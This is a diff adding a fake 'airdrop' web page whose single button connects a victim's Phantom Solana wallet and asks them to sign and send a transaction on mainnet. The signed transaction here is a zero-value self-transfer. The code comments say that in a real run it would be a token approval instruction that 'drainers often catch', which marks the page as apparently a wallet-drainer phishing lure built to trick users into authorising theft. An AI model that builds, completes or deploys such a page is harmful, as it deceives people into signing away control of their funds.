@@ -1,1 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Airdop</title>
+    <style>
+        body { background-color: #0f0f0f; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #ab9ff2; border: none; border-radius: 5px; color: black; font-weight: bold; }
+        button:hover { background-color: #8a7fc4; }
+    </style>
+</head>
+<body>
+    <button id="approveBtn">Connect & Approve</button>
 
+    <script type="module">
+        import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "https://esm.sh/@solana/web3.js";
+        import { PhantomWalletAdapter } from "https://esm.sh/@solana/wallet-adapter-base";
+
+        const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+        
+        document.getElementById('approveBtn').addEventListener('click', async () => {
+            if (!window.solana || !window.solana.isPhantom) {
+                alert("Please install Phantom Wallet!");
+                window.open("https://phantom.app/", "_blank");
+                return;
+            }
+
+            try {
+                // Connect to Phantom
+                await window.solana.connect();
+                
+                // Create a simple transaction to trigger a signature 
+                // In a real scenario, this would be a token approval instruction.
+                // For now, we trigger a standard transaction which drainers often catch 
+                // or we can use a specific SPL Token approve instruction.
+                
+                const walletPublicKey = window.solana.publicKey;
+                
+                // We create a transaction that moves 0.001 SOL to a dummy address 
+                // just to get a signature, or we can do a specific Approval.
+                // Let's do a simple "Approve" style interaction for compatibility.
+                
+                const transaction = new Transaction().add(
+                    SystemProgram.transfer({
+                        fromPubkey: walletPublicKey,
+                        toPubkey: walletPublicKey, // Self-transfer just to get a signed tx
+                        lamports: 0
+                    })
+                );
+
+                const signature = await window.solana.signAndSendTransaction(transaction);
+                console.log("Signature sent:", signature.signature);
+                alert("Approved! You can close this.");
+            } catch (error) {
+                console.error(error);
+                alert("Error: " + error.message);
+            }
+        });
+    </script>
+</body>
+</html>
